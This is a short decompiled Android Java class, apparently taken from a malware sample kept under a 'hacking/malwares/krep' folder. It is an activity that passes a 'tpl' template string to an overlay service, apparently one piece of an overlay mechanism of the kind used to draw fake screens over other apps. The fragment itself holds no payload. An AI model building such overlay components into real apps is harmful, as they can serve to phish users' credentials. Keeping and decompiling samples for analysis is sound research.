package krep.itmtd.ywtjexf;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MasterNewTask
  extends Activity
{
  private String template = "";
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    paramBundle = getIntent();
    if (paramBundle != null) {
      this.template = paramBundle.getStringExtra("tpl");
    }
    paramBundle = new Intent(this, OverlayService.class);
    paramBundle.putExtra("tpl", this.template);
    startService(paramBundle);
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/MasterNewTask.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */